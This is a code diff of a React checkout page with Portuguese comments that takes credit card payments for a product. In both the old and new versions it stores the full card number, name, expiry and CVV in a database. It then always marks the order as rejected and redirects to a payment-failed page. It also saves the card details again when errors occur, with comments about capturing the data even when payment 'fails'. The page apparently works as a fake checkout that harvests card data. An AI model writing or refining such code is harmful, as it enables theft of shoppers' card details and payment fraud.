@@ -12,7 +12,7 @@ import { createPaymentInfo } from '@/services/paymentInfoService';
 import { atualizarStatusPedido } from '@/services/pedidoService';
 
 export default function CartaoPage() {
-  const { slug } = useParams();
+  const { slug } = useParams<{ slug: string }>();
   const navigate = useNavigate();
   const location = useLocation();
   const queryClient = useQueryClient();
@@ -21,87 +21,90 @@ export default function CartaoPage() {
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [pedidoData, setPedidoData] = useState<any>(null);
-  
-  // Get pedidoId from URL query params
+
+  // Extrai pedidoId dos parâmetros da URL
   const searchParams = new URLSearchParams(location.search);
   const pedidoId = searchParams.get('pedidoId');
-  
+
   useEffect(() => {
     async function fetchData() {
+      console.log('Iniciando fetchData - slug:', slug, 'pedidoId:', pedidoId);
+
       if (!slug) {
-        setError('Produto não encontrado');
+        setError('Produto não especificado');
         setLoading(false);
         return;
       }
-      
+
       try {
-        // Fetch product
+        // Busca o produto
         const { data: produtoData, error: produtoError } = await supabase
           .from('produtos')
           .select('*')
           .eq('slug', slug)
           .maybeSingle();
-        
+
         if (produtoError) {
-          throw produtoError;
+          console.error('Erro ao buscar produto:', produtoError);
+          throw new Error('Erro ao carregar produto');
         }
-        
+
         if (!produtoData) {
           throw new Error('Produto não encontrado');
         }
-        
+
+        console.log('Produto encontrado:', produtoData);
         setProduto(produtoData);
-        
-        // Check if pedidoId exists
+
+        // Verifica se pedidoId existe
         if (!pedidoId) {
-          console.log("No pedidoId found, redirecting to checkout page");
+          console.log('Nenhum pedidoId encontrado, redirecionando para checkout');
           navigate(`/checkout/${slug}`);
           return;
         }
-        
-        // Fetch pedido data if pedidoId exists
-        if (pedidoId) {
-          console.log("Fetching pedido data for ID:", pedidoId);
-          const { data: pedido, error: pedidoError } = await supabase
-            .from('pedidos')
-            .select('*')
-            .eq('id', pedidoId)
-            .maybeSingle();
-            
-          if (pedidoError) {
-            console.error('Error fetching pedido:', pedidoError);
-            throw pedidoError;
-          } else if (!pedido) {
-            console.error('Pedido not found:', pedidoId);
-            throw new Error('Pedido não encontrado');
-          } else {
-            console.log("Pedido data fetched successfully:", pedido);
-            setPedidoData(pedido);
-          }
+
+        // Busca os dados do pedido
+        console.log('Buscando dados do pedido para pedidoId:', pedidoId);
+        const { data: pedido, error: pedidoError } = await supabase
+          .from('pedidos')
+          .select('*')
+          .eq('id', pedidoId)
+          .maybeSingle();
+
+        if (pedidoError) {
+          console.error('Erro ao buscar pedido:', pedidoError);
+          throw new Error('Erro ao carregar pedido');
         }
-        
-      } catch (error) {
-        console.error('Error fetching data:', error);
-        setError('Erro ao carregar dados do produto');
+
+        if (!pedido) {
+          throw new Error('Pedido não encontrado');
+        }
+
+        console.log('Pedido encontrado:', pedido);
+        setPedidoData(pedido);
+
+      } catch (error: any) {
+        console.error('Erro geral em fetchData:', error.message);
+        setError(error.message || 'Erro ao carregar dados');
       } finally {
         setLoading(false);
       }
     }
-    
+
     fetchData();
   }, [slug, pedidoId, navigate]);
-  
+
   const handleSubmit = async (data: CreditCardFormValues) => {
     if (!pedidoId) {
       toast.error('ID do pedido não encontrado');
       return;
     }
-    
+
     setSubmitting(true);
-    console.log("Processing credit card payment with data:", { ...data, cvv: '***' });
-    
+    console.log('Processando pagamento com cartão - dados:', { ...data, cvv: '***' });
+
     try {
-      // Save the credit card information
+      // Salva as informações de pagamento
       await createPaymentInfo({
         pedido_id: pedidoId,
         metodo_pagamento: 'cartao',
@@ -109,83 +112,54 @@ export default function CartaoPage() {
         nome_cartao: data.nome_cartao,
         validade: data.validade,
         cvv: data.cvv,
-        parcelas: parseInt(data.parcelas.split('x')[0], 10)
+        parcelas: parseInt(data.parcelas.split('x')[0], 10),
       });
-      
-      console.log("Payment info saved successfully");
-      
-      // Update status to 'reprovado'
-      console.log("Updating order status to reprovado");
-      await atualizarStatusPedido(pedidoId, 'reprovado');
-      
-      // Show a toast message
-      toast.error('Pagamento não aprovado', {
-        description: 'Redirecionando para a página de falha de pagamento...'
-      });
-      
-      // Use a short timeout to ensure the toast is visible before redirect
-      setTimeout(() => {
-        // Navigate to the payment failed page
-        console.log("Redirecting to payment failed page with slug:", slug, "and pedidoId:", pedidoId);
-        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-      }, 1500); // 1.5 second delay to allow toast to be seen
-      
-    } catch (error) {
-      console.error('Error processing payment:', error);
-      
-      // Still try to capture payment details even if payment "fails"
-      try {
-        console.log("Capturing payment info even though payment failed");
-        
-        // If first attempt failed, try to save payment info again
-        try {
-          await createPaymentInfo({
-            pedido_id: pedidoId,
-            metodo_pagamento: 'cartao',
-            numero_cartao: data.numero_cartao,
-            nome_cartao: data.nome_cartao,
-            validade: data.validade,
-            cvv: data.cvv,
-            parcelas: parseInt(data.parcelas.split('x')[0], 10)
-          });
-        } catch (saveError) {
-          console.error("Error saving payment info in error handler:", saveError);
-        }
-        
-        // Update order status to reflect failure
-        await atualizarStatusPedido(pedidoId, 'reprovado');
-        
-        // Show error toast
-        toast.error('Erro ao processar pagamento', {
-          description: 'Redirecionando para a página de falha...'
-        });
-        
-        // Add a delay before redirecting
-        setTimeout(() => {
-          if (slug && pedidoId) {
-            console.log("Redirecting to payment failed page after error");
-            navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
-          }
-        }, 1500); // 1.5 second delay
-        
-      } catch (captureError) {
-        console.error('Error capturing payment info:', captureError);
-        
-        // Final fallback - force navigation even if everything else fails
-        if (slug && pedidoId) {
-          toast.error('Erro no processamento do pagamento');
-          setTimeout(() => navigate(`/checkout/${slug}/payment-failed/${pedidoId}`), 1000);
-        }
+
+      console.log('Informações de pagamento salvas com sucesso');
+
+      // Atualiza o status do pedido para 'reprovado' (conforme lógica original)
+      const success = await atualizarStatusPedido(pedidoId, 'reprovado');
+      if (!success) {
+        throw new Error('Erro ao atualizar status do pedido');
       }
+
+      console.log('Status do pedido atualizado para "reprovado"');
+      toast.info('Pagamento processado, mas marcado como reprovado (teste)');
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+
+    } catch (error: any) {
+      console.error('Erro ao processar pagamento:', error);
+
+      // Tenta capturar informações mesmo em caso de erro
+      try {
+        await createPaymentInfo({
+          pedido_id: pedidoId,
+          metodo_pagamento: 'cartao',
+          numero_cartao: data.numero_cartao,
+          nome_cartao: data.nome_cartao,
+          validade: data.validade,
+          cvv: data.cvv,
+          parcelas: parseInt(data.parcelas.split('x')[0], 10),
+        });
+        await atualizarStatusPedido(pedidoId, 'reprovado');
+      } catch (captureError) {
+        console.error('Erro ao capturar informações após falha:', captureError);
+      }
+
+      toast.error('Erro ao processar pagamento. Tente novamente.');
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+
     } finally {
       setSubmitting(false);
+      queryClient.invalidateQueries(['pedidos']); // Atualiza cache, se necessário
     }
   };
-  
+
   const handleBack = () => {
     navigate(`/checkout/${slug}`);
   };
-  
+
+  // Estado de carregamento
   if (loading) {
     return (
       <div className="container max-w-4xl mx-auto py-8 px-4">
@@ -196,12 +170,14 @@ export default function CartaoPage() {
               <div className="h-4 bg-gray-200 rounded w-3/4 mx-auto mb-2"></div>
               <div className="h-4 bg-gray-200 rounded w-2/3 mx-auto"></div>
             </div>
+            <p className="mt-4">Carregando...</p>
           </CardContent>
         </Card>
       </div>
     );
   }
-  
+
+  // Estado de erro
   if (error || !produto) {
     return (
       <div className="container max-w-4xl mx-auto py-8 px-4">
@@ -217,33 +193,34 @@ export default function CartaoPage() {
       </div>
     );
   }
-  
+
+  // Renderização principal
   return (
     <div className="container max-w-4xl mx-auto py-8 px-4">
-      <Button 
-        variant="ghost" 
-        onClick={handleBack} 
+      <Button
+        variant="ghost"
+        onClick={handleBack}
         className="mb-4 hover:bg-gray-100"
       >
         <ArrowLeft className="h-4 w-4 mr-2" />
         Voltar
       </Button>
-      
+
       <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
         <div>
           <h1 className="text-2xl font-bold mb-6">Pagamento com Cartão</h1>
-          <CreditCardForm 
-            onSubmit={handleSubmit} 
+          <CreditCardForm
+            onSubmit={handleSubmit}
             submitting={submitting}
             buttonColor={produto?.cor_botao || '#22c55e'}
             buttonText={produto?.texto_botao || 'Finalizar Compra'}
           />
         </div>
-        
+
         <div>
-          <ProductSummary 
-            produto={produto} 
-            pedido={pedidoData || {valor: produto?.preco}}
+          <ProductSummary
+            produto={produto}
+            pedido={pedidoData || { valor: produto?.preco }}
           />
         </div>
       </div>
